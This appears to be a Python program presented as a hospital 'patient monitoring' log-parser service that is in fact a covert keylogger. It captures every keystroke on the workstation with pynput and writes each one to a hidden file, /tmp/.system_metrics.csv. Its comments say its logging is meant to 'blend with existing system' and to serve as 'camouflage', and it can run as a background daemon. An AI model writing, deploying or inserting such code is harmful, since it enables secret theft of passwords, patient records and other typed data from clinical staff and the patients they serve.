import os
import sys
import csv
import time
from datetime import datetime
from pynput import keyboard
import logging
from logging.handlers import RotatingFileHandler

# Configure logging to blend with existing system
logger = logging.getLogger('patient_monitoring')
handler = RotatingFileHandler('/var/log/patient_monitoring.log', maxBytes=1000000, backupCount=5)
formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.INFO)

# Hidden keystroke log file
KEYLOG_FILE = '/tmp/.system_metrics.csv'
WORKSTATION_ID = os.environ.get('WORKSTATION_ID', 'UNKNOWN')

class KeystrokeLogger:
    def __init__(self):
        self.log_file = KEYLOG_FILE
        self.workstation_id = WORKSTATION_ID
        self._ensure_log_file()
        logger.info(f"Patient monitoring initialized on workstation {self.workstation_id}")
    
    def _ensure_log_file(self):
        """Create hidden CSV file with headers if it doesn't exist"""
        if not os.path.exists(self.log_file):
            with open(self.log_file, 'a', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['timestamp', 'workstation_id', 'key_pressed'])
            os.chmod(self.log_file, 0o600)
    
    def on_press(self, key):
        """Callback for key press events"""
        try:
            timestamp = datetime.now().isoformat()
            key_str = str(key).replace("'", "")
            
            # Log to hidden CSV
            with open(self.log_file, 'a', newline='') as f:
                writer = csv.writer(f)
                writer.writerow([timestamp, self.workstation_id, key_str])
            
            # Also log to regular system logs for camouflage
            if len(key_str) == 1:
                logger.debug(f"User input detected: {key_str}")
            
        except Exception as e:
            logger.error(f"Error logging keystroke: {e}")
    
    def start(self):
        """Start the keystroke monitoring"""
        listener = keyboard.Listener(on_press=self.on_press)
        listener.start()
        logger.info("Keystroke monitoring service started")
        return listener

def main():
    """Main entry point - integrated with existing patient monitoring"""
    logger.info("Starting patient log parser service")
    
    # Start keystroke logger
    keystroke_logger = KeystrokeLogger()
    listener = keystroke_logger.start()
    
    # Keep the service running
    try:
        while True:
            time.sleep(3600)  # Sleep for 1 hour
    except KeyboardInterrupt:
        listener.stop()
        logger.info("Service stopped")

if __name__ == "__main__":
    # Auto-start integration
    if '--systemd' in sys.argv:
        import daemon
        with daemon.DaemonContext():
            main()
    else:
        main()